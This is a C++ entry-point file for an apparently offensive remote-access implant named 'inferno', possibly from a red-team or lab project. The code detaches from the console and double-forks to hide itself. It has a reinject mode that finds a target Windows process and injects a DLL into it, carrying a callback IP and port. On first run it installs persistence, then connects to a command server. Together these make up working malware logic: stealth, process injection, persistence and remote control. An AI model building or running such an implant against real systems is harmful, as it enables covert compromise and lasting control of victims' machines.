#include "../include/Agent.hpp"
#include "../../common/include/CryptoContext.hpp"
#include <iostream>
#include <cstdio>
#include <cstring>

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#endif

#include "../include/WindowsInjector.hpp"

#ifndef _WIN32
#include <unistd.h>
#include <sys/stat.h>
#endif

namespace {

void daemonize() {
#ifdef INFERNO_TESTING
    return; // Keep console visible in test builds
#endif

#ifndef _WIN32
    // When launched by launchd (parent PID is 1), skip daemonization.
    // launchd handles backgrounding, and we need it to track the process
    // for KeepAlive restart-on-crash to work.
    if (::getppid() == 1) {
        return;
    }
#endif

#ifdef _WIN32
    // Detach from the parent console. If the binary is compiled with
    // /SUBSYSTEM:WINDOWS (CMake: WIN32_EXECUTABLE), no console is created
    // at all. This call handles the case where it's run from a console.
    if (FreeConsole()) {
        // Successfully detached
    }
#else
    // Double-fork daemonization (POSIX)
    pid_t pid = ::fork();
    if (pid < 0) {
        return; // fork failed — continue anyway
    }
    if (pid > 0) {
        ::exit(0); // Parent exits — child continues
    }

    // First child: create new session, detach from terminal
    ::setsid();
    ::umask(0);

    // Second fork — grandchild becomes the actual agent
    pid = ::fork();
    if (pid < 0) {
        return;
    }
    if (pid > 0) {
        ::exit(0); // First child exits — grandchild continues
    }

    // Grandchild: redirect stdio to /dev/null
    (void)::freopen("/dev/null", "r", stdin);
    (void)::freopen("/dev/null", "w", stdout);
    (void)::freopen("/dev/null", "w", stderr);
#endif
}

#ifdef _WIN32

struct ReinjectConfig {
    std::string target_exe;
    std::string dll_path;
    std::string server_ip;
    uint16_t server_port;
};

static bool readReinjectConfig(const std::string& cfg_path,
                                ReinjectConfig& cfg) {
    FILE* f = ::fopen(cfg_path.c_str(), "r");
    if (!f) return false;
    char line[4096];
    // Format: target_exe \n dll_path \n server_ip \n server_port \n
    if (!::fgets(line, sizeof(line), f)) { ::fclose(f); return false; }
    line[strcspn(line, "\r\n")] = '\0'; cfg.target_exe = line;
    if (!::fgets(line, sizeof(line), f)) { ::fclose(f); return false; }
    line[strcspn(line, "\r\n")] = '\0'; cfg.dll_path = line;
    if (!::fgets(line, sizeof(line), f)) { ::fclose(f); return false; }
    line[strcspn(line, "\r\n")] = '\0'; cfg.server_ip = line;
    if (!::fgets(line, sizeof(line), f)) { ::fclose(f); return false; }
    line[strcspn(line, "\r\n")] = '\0'; cfg.server_port =
        static_cast<uint16_t>(std::atoi(line));
    ::fclose(f);
    return true;
}

static int reinjectMain(const std::string& cfg_path) {
    ReinjectConfig cfg;
    if (!readReinjectConfig(cfg_path, cfg)) {
        std::fprintf(stderr, "[Reinject] Failed to read config: %s\n",
                     cfg_path.c_str());
        return 1;
    }

    // Wait up to 30s for target process to appear
    DWORD pid = 0;
    for (int i = 0; i < 30 && pid == 0; ++i) {
        pid = inferno::tier2::findProcessPid(cfg.target_exe);
        if (pid == 0) ::Sleep(1000);
    }
    if (pid == 0) {
        std::fprintf(stderr, "[Reinject] Target %s not found after 30s\n",
                     cfg.target_exe.c_str());
        return 1;
    }

    std::fprintf(stdout, "[Reinject] Injecting %s into PID %lu (%s)\n",
                 cfg.dll_path.c_str(), pid, cfg.target_exe.c_str());
    bool ok = inferno::tier2::injectIntoTarget(pid, cfg.dll_path,
                                                cfg.server_ip,
                                                cfg.server_port);
    return ok ? 0 : 1;
}

#endif // _WIN32

} // anonymous namespace

int main(int argc, char* argv[]) {
#if defined(_WIN32) && !defined(INFERNO_TESTING)
    if (argc >= 2 && std::strcmp(argv[1], "--reinject") == 0) {
        // Config is at argv[0].cfg (same name as the binary)
        std::string cfg_path = std::string(argv[0]) + ".cfg";
        return reinjectMain(cfg_path);
    }
#endif
    daemonize();

    std::string ip = "127.0.0.1";
    uint16_t port = 4242;

    if (argc >= 3) {
        ip = argv[1];
        try {
            size_t consumed = 0;
            int p = std::stoi(argv[2], &consumed);
            if (consumed != std::string(argv[2]).length() || p < 1 || p > 65535) {
                throw std::out_of_range("Invalid port");
            }
            port = static_cast<uint16_t>(p);
        } catch (...) {
            return 1;
        }
    }

    inferno::CryptoContext::instance().initDefault();

    // Install persistence on first run (Phase 2.5)
    if (argc > 0 && argv[0]) {
        inferno::Agent::installPersistence(argv[0], ip, port);
    }
    
    std::string binary_path = (argc > 0 && argv[0]) ? argv[0] : "";
    inferno::Agent agent(ip, port, binary_path);
    agent.run();

    return 0;
}
